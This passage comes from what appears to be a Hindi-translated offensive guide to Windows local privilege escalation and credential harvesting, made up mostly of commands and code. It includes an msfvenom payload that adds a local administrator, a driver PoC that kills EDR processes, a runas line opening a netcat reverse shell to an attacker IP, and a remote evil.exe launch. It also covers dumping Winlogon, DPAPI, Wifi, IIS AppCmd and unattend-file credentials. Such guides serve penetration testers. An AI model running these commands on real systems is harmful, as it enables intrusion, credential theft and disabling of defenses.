उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows यह execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
built-in Windows services को छोड़कर, सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप metasploit के साथ** इस vulnerability को detect और exploit कर सकते हैं: `exploit/windows/local/trusted\_service\_path` आप manually metasploit के साथ एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

Windows उपयोगकर्ताओं को यह निर्दिष्ट करने की अनुमति देता है कि यदि कोई service fail होती है तो कौन-सी actions ली जाएँ। इस feature को एक binary की ओर point करने के लिए configure किया जा सकता है। यदि इस binary को replace किया जा सकता है, तो privilege escalation संभव हो सकती है। अधिक जानकारी [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) में मिल सकती है।

## Applications

### Installed Applications

**binaries** की permissions (शायद आप किसी एक को overwrite करके privileges escalate कर सकें) और **folders** ([DLL Hijacking](dll-hijacking/index.html)) की permissions जाँचें।
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### Write Permissions

जांचें कि क्या आप कुछ config file को modify करके कोई special file read कर सकते हैं या कोई ऐसा binary modify कर सकते हैं जिसे Administrator account द्वारा execute किया जाने वाला है (schedtasks)।

system में weak folder/files permissions ढूँढने का एक तरीका यह है:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++ अपने `plugins` subfolders के भीतर किसी भी plugin DLL को autoload करता है। अगर writable portable/copy install मौजूद है, तो malicious plugin drop करने से हर launch पर `notepad++.exe` के अंदर automatic code execution मिलती है (including `DllMain` and plugin callbacks से)।

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Run at startup

**Check if you can overwrite some registry or binary that is going to be executed by a different user.**\
**Read** the **following page** to learn more about interesting **autoruns locations to escalate privileges**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Possible **third party weird/vulnerable** drivers खोजें
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
यदि कोई driver एक arbitrary kernel read/write primitive expose करता है (poorly designed IOCTL handlers में यह आम है), तो आप kernel memory से सीधे एक SYSTEM token चुरा कर escalate कर सकते हैं। step-by-step technique यहाँ देखें:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

उन race-condition bugs के लिए जहाँ vulnerable call attacker-controlled Object Manager path खोलती है, lookup को जानबूझकर धीमा करना (max-length components या deep directory chains का उपयोग करके) window को microseconds से tens of microseconds तक बढ़ा सकता है:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive vulnerabilities आपको deterministic layouts groom करने, writable HKLM/HKU descendants का abuse करने, और metadata corruption को custom driver के बिना kernel paged-pool overflows में convert करने देती हैं। पूरी chain यहाँ सीखें:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` direct-mode type confusion from attacker-controlled paths

कुछ drivers userland से registry path accept करते हैं, केवल यह validate करते हैं कि वह एक sane UTF-16 string है, और फिर `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` को `RTL_QUERY_REGISTRY_DIRECT` के साथ किसी stack scalar जैसे `int readValue` में call करते हैं। यदि `RTL_QUERY_REGISTRY_TYPECHECK` missing है, तो `EntryContext` को **actual** registry type के अनुसार interpret किया जाता है, developer द्वारा expected type के अनुसार नहीं।

यह दो useful primitives बनाता है:

- **Confused deputy / oracle**: user-controlled absolute `\Registry\...` path driver को attacker-chosen keys query करने देता है, return codes/logs के through existence leak करता है, और कभी-कभी ऐसे values read करने देता है जिन्हें caller सीधे access नहीं कर सकता।
- **Kernel memory corruption**: `&readValue` जैसा scalar destination registry value type के आधार पर `REG_QWORD`, `UNICODE_STRING`, या sized binary buffer के रूप में type-confused हो जाता है।

Practical exploitation notes:

- **Windows 8+ mitigation**: यदि query `RTL_QUERY_REGISTRY_DIRECT` के साथ किसी **untrusted hive** पर hit करती है लेकिन `RTL_QUERY_REGISTRY_TYPECHECK` के बिना है, तो kernel callers `KERNEL_SECURITY_CHECK_FAILURE (0x139)` के साथ crash करते हैं। exploitability बनाए रखने के लिए, `HKCU` के नीचे values stage करने के बजाय **trusted system hives** के अंदर attacker-writable keys खोजें।
- **Trusted-hive staging**: `\Registry\Machine` के writable descendants enumerate करने के लिए NtObjectManager का उपयोग करें, और sandboxed contexts से reachable keys खोजने के लिए duplicated **low-integrity** token के साथ scan फिर से चलाएँ:
```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```
- **`REG_QWORD`**: 4-byte `int` पर 8-byte direct write आस-पास के stack data को corrupt कर देती है और पास के callback/function pointer को आंशिक रूप से overwrite कर सकती है।
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode में `EntryContext` का `UNICODE_STRING` की ओर point करना अपेक्षित है। अगर code पहले attacker-controlled `REG_DWORD` को stack scalar में load करता है और फिर उसी buffer को string read के लिए reuse करता है, तो attacker `Length`/`MaximumLength` को control करता है और `Buffer` pointer पर आंशिक प्रभाव डालता है, जिससे semi-controlled kernel write मिलती है।
- **`REG_BINARY`**: बड़े binary data के लिए, direct mode `EntryContext` पर मौजूद पहले `LONG` को signed buffer size की तरह मानता है। अगर पहले का `REG_DWORD` read reused scalar में attacker-controlled **negative** value छोड़ देता है, तो अगला `REG_BINARY` query attacker bytes को सीधे adjacent stack slots पर copy करता है, जो अक्सर full callback-pointer overwrite तक पहुँचने का सबसे साफ रास्ता होता है।

Strong hunting pattern: **same stack variable में बिना reinitializing किए heterogeneous registry reads**। `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, reused `EntryContext` pointers, और ऐसे code paths को grep करें जहाँ पहला registry read तय करता है कि दूसरा read होगा या नहीं।

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

कुछ signed third‑party drivers अपना device object strong SDDL के साथ `IoCreateDeviceSecure` से create करते हैं, लेकिन `DeviceCharacteristics` में `FILE_DEVICE_SECURE_OPEN` सेट करना भूल जाते हैं। इस flag के बिना, extra component वाले path से device खोलने पर secure DACL enforce नहीं होती, जिससे कोई भी unprivileged user namespace path जैसे:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (real-world case से)

का उपयोग करके handle प्राप्त कर सकता है।

एक बार user device open कर ले, तो driver द्वारा exposed privileged IOCTLs का misuse LPE और tampering के लिए किया जा सकता है। Wild में देखी गई example capabilities:
- Arbitrary processes के लिए full-access handles लौटाना (token theft / `DuplicateTokenEx`/`CreateProcessAsUser` के जरिए SYSTEM shell)।
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks)।
- Arbitrary processes terminate करना, including Protected Process/Light (PP/PPL), जिससे kernel के जरिए user land से AV/EDR kill किया जा सकता है।

Minimal PoC pattern (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
डेवलपर्स के लिए mitigations
- जब DACL द्वारा restricted device objects बनाए जा रहे हों, तब हमेशा FILE_DEVICE_SECURE_OPEN सेट करें।
- privileged operations के लिए caller context validate करें। process termination या handle returns की अनुमति देने से पहले PP/PPL checks जोड़ें।
- IOCTLs को constrain करें (access masks, METHOD_*, input validation) और direct kernel privileges की बजाय brokered models पर विचार करें।

defenders के लिए detection ideas
- suspicious device names (e.g., \\ .\\amsdk*) के user-mode opens और abuse के संकेत देने वाले specific IOCTL sequences को monitor करें।
- Microsoft की vulnerable driver blocklist (HVCI/WDAC/Smart App Control) enforce करें और अपनी own allow/deny lists maintain करें।


## PATH DLL Hijacking

अगर आपके पास PATH में मौजूद किसी folder के अंदर **write permissions** हैं, तो आप किसी process द्वारा loaded DLL को hijack करके **privileges escalate** कर सकते हैं।

PATH के अंदर सभी folders की permissions जांचें:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
अधिक जानकारी के लिए कि इस check का दुरुपयोग कैसे करें:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Node.js / Electron module resolution hijacking via `C:\node_modules`

यह **Windows uncontrolled search path** का एक variant है जो **Node.js** और **Electron** applications को affect करता है जब वे `require("foo")` जैसा bare import करते हैं और expected module **missing** होता है।

Node directory tree में ऊपर की ओर जाकर packages resolve करता है और हर parent पर `node_modules` folders check करता है। Windows पर, यह walk drive root तक पहुँच सकती है, इसलिए `C:\Users\Administrator\project\app.js` से launch की गई application अंत में यह probe कर सकती है:

1. `C:\Users\Administrator\project\node_modules\foo`
2. `C:\Users\Administrator\node_modules\foo`
3. `C:\Users\node_modules\foo`
4. `C:\node_modules\foo`

अगर कोई **low-privileged user** `C:\node_modules` बना सकता है, तो वह एक malicious `foo.js` (या package folder) रख सकता है और **higher-privileged Node/Electron process** के missing dependency resolve करने का इंतज़ार कर सकता है। payload victim process के security context में execute होता है, इसलिए यह **LPE** बन जाता है जब target administrator के रूप में, elevated scheduled task/service wrapper से, या auto-started privileged desktop app के रूप में चलता है।

यह खास तौर पर common है जब:

- कोई dependency `optionalDependencies` में declared हो
- कोई third-party library `require("foo")` को `try/catch` में wrap करे और failure पर आगे बढ़ जाए
- कोई package production builds से हटाया गया हो, packaging के दौरान omit हुआ हो, या install होने में fail हुआ हो
- vulnerable `require()` main application code की बजाय dependency tree के deep अंदर मौजूद हो

### Vulnerable targets hunting

Resolution path prove करने के लिए **Procmon** use करें:

- `Process Name` को target executable (`node.exe`, Electron app EXE, या wrapper process) पर filter करें
- `Path` को `node_modules` contain करने पर filter करें
- `NAME NOT FOUND` और `C:\node_modules` के नीचे वाले final successful open पर focus करें

Unpacked `.asar` files या application sources में useful code-review patterns:
```bash
rg -n 'require\\("[^./]' .
rg -n "require\\('[^./]" .
rg -n 'optionalDependencies' .
rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
```
### Exploitation

1. Procmon या source review से **missing package name** की पहचान करें।
2. यदि root lookup directory पहले से मौजूद नहीं है, तो उसे बनाएं:
```powershell
mkdir C:\node_modules
```
3. एक module को exact expected name के साथ drop करें:
```javascript
// C:\node_modules\foo.js
require("child_process").exec("calc.exe")
module.exports = {}
```
4. पीड़ित एप्लिकेशन को ट्रिगर करें। अगर एप्लिकेशन `require("foo")` करने की कोशिश करता है और वैध module मौजूद नहीं है, तो Node `C:\node_modules\foo.js` लोड कर सकता है।

इस पैटर्न से मेल खाने वाले missing optional modules के वास्तविक उदाहरणों में `bluebird` और `utf-8-validate` शामिल हैं, लेकिन **technique** ही पुन: उपयोग योग्य हिस्सा है: कोई भी **missing bare import** ढूंढें जिसे कोई privileged Windows Node/Electron process resolve करेगा।

### Detection और hardening ideas

- जब कोई user `C:\node_modules` बनाता है या वहाँ नए `.js` files/packages लिखता है, तो alert करें।
- High-integrity processes को `C:\node_modules\*` से पढ़ते हुए hunt करें।
- Production में सभी runtime dependencies package करें और `optionalDependencies` usage audit करें।
- Third-party code में silent `try { require("...") } catch {}` patterns की review करें।
- जब library support करे, optional probes disable करें (उदाहरण के लिए, कुछ `ws` deployments legacy `utf-8-validate` probe को `WS_NO_UTF_8_VALIDATE=1` के साथ avoid कर सकते हैं)।

## Network

### Shares
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file में hardcoded अन्य known computers की जाँच करें
```
type C:\Windows\System32\drivers\etc\hosts
```
### नेटवर्क इंटरफेस & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### खुले पोर्ट

बाहर से **restricted services** की जाँच करें
```bash
netstat -ano #Opened ports?
```
### रूटिंग टेबल
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP तालिका
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### फ़ायरवॉल नियम

[**फ़ायरवॉल से संबंधित commands के लिए यह page देखें**](../basic-cmd-for-pentesters.md#firewall) **(list rules, create rules, turn off, turn off...)**

[network enumeration के लिए और commands यहाँ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
Binary `bash.exe` को भी `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` में पाया जा सकता है

अगर आपको root user मिल जाता है, तो आप किसी भी port पर listen कर सकते हैं (पहली बार जब आप किसी port पर listen करने के लिए `nc.exe` का उपयोग करेंगे, तो यह GUI के माध्यम से पूछेगा कि क्या firewall द्वारा `nc` को अनुमति दी जानी चाहिए)।
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash को root के रूप में आसानी से शुरू करने के लिए, आप `--default-user root` आज़मा सकते हैं

आप `WSL` filesystem को `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` फ़ोल्डर में एक्सप्लोर कर सकते हैं

## Windows Credentials

### Winlogon Credentials
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
The Windows Vault सर्वर, वेबसाइट्स और अन्य programs के लिए user credentials store करता है जिन्हें **Windows** users को automaticall**y** log in कर सकता है। पहली नज़र में, यह ऐसा लग सकता है कि अब users अपने Facebook credentials, Twitter credentials, Gmail credentials आदि store कर सकते हैं, ताकि वे browsers के ज़रिए automatically log in हो जाएँ। लेकिन ऐसा नहीं है।

Windows Vault उन credentials को store करता है जिनके लिए Windows users को automatically log in कर सकता है, जिसका मतलब है कि कोई भी **Windows application that needs credentials to access a resource** (server or a website) **इस Credential Manager** & Windows Vault का use कर सकती है और users के बार-बार username और password enter करने के बजाय supplied credentials का use कर सकती है।

जब तक applications Credential Manager के साथ interact नहीं करतीं, मुझे नहीं लगता कि वे किसी दिए गए resource के लिए credentials use कर सकती हैं। इसलिए, अगर आपका application vault का use करना चाहता है, तो उसे somehow **credential manager के साथ communicate करना चाहिए और default storage vault से उस resource के लिए credentials request करने चाहिए**।

Machine पर stored credentials list करने के लिए `cmdkey` का use करें।
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
फिर आप सहेजे गए credentials का उपयोग करने के लिए `/savecred` options के साथ `runas` का उपयोग कर सकते हैं। निम्न उदाहरण एक SMB share के माध्यम से remote binary को call कर रहा है।
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
प्रदान किए गए credential सेट के साथ `runas` का उपयोग करना।
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** डेटा के सममित एन्क्रिप्शन के लिए एक method प्रदान करता है, जिसका उपयोग मुख्य रूप से Windows operating system में asymmetric private keys के सममित एन्क्रिप्शन के लिए किया जाता है। यह encryption entropy में महत्वपूर्ण योगदान देने के लिए user या system secret का लाभ उठाता है।

**DPAPI, user के login secrets से derived एक symmetric key के माध्यम से keys के encryption को सक्षम करता है**। system encryption से जुड़े scenarios में, यह system के domain authentication secrets का उपयोग करता है।

Encrypted user RSA keys, DPAPI का उपयोग करके, `%APPDATA%\Microsoft\Protect\{SID}` directory में stored होती हैं, जहाँ `{SID}` user के [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) का प्रतिनिधित्व करता है। **DPAPI key, master key के साथ co-located होती है जो उसी file में user की private keys की रक्षा करती है**, और आमतौर पर 64 bytes random data से बनी होती है। (यह ध्यान रखना महत्वपूर्ण है कि इस directory तक access restricted होता है, जिससे `dir` command in CMD के माध्यम से इसकी contents को list करना संभव नहीं होता, हालांकि इसे PowerShell के माध्यम से list किया जा सकता है)।
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
आप **mimikatz module** `dpapi::masterkey` को उपयुक्त arguments (`/pvk` या `/rpc`) के साथ use करके इसे decrypt कर सकते हैं।

**master password** द्वारा protected **credentials files** आमतौर पर यहाँ located होते हैं:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
आप **memory** से `sekurlsa::dpapi` module का उपयोग करके कई **DPAPI** **masterkeys** निकाल सकते हैं (अगर आप root हैं).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

**PowerShell credentials** अक्सर **scripting** और automation tasks के लिए convenient तरीके से encrypted credentials store करने के लिए इस्तेमाल किए जाते हैं। ये credentials **DPAPI** का उपयोग करके protected होते हैं, जिसका आमतौर पर मतलब है कि इन्हें केवल उसी user और उसी computer पर decrypt किया जा सकता है जिस पर वे बनाए गए थे।

फ़ाइल से मौजूद किसी PS credentials को **decrypt** करने के लिए आप यह कर सकते हैं:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

आप उन्हें `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
और `HKCU\Software\Microsoft\Terminal Server Client\Servers\` में पा सकते हैं

### Recently Run Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Remote Desktop Credential Manager**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file. This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

जांचें कि `C:\Windows\CCM\SCClient.exe` मौजूद है या नहीं .\
इंस्टॉलर **SYSTEM privileges** के साथ **run** होते हैं, कई **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).** के लिए vulnerable हैं।
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## फाइलें और रजिस्ट्री (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Host Keys
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### रजिस्ट्री में SSH keys

SSH private keys रजिस्ट्री key `HKCU\Software\OpenSSH\Agent\Keys` के अंदर store हो सकते हैं, इसलिए आपको check करना चाहिए कि उसमें कुछ interesting है या नहीं:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
यदि आपको उस path के अंदर कोई entry मिलती है, तो वह संभवतः एक saved SSH key होगी। यह encrypted रूप में stored होती है, लेकिन इसे आसानी से [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) का उपयोग करके decrypt किया जा सकता है।\
इस technique के बारे में अधिक जानकारी यहाँ: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

यदि `ssh-agent` service running नहीं है और आप चाहते हैं कि यह boot पर automatically start हो, तो run करें:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> ऐसा लगता है कि यह technique अब valid नहीं है। मैंने कुछ ssh keys create करने, उन्हें `ssh-add` के साथ add करने, और ssh via login करके एक machine में जाने की कोशिश की। registry HKCU\Software\OpenSSH\Agent\Keys मौजूद नहीं है और procmon ने asymmetric key authentication के दौरान `dpapi.dll` के use को identify नहीं किया।

### Unattended files
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
आप इन फ़ाइलों को **metasploit** का उपयोग करके भी खोज सकते हैं: _post/windows/gather/enum_unattend_

उदाहरण सामग्री:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
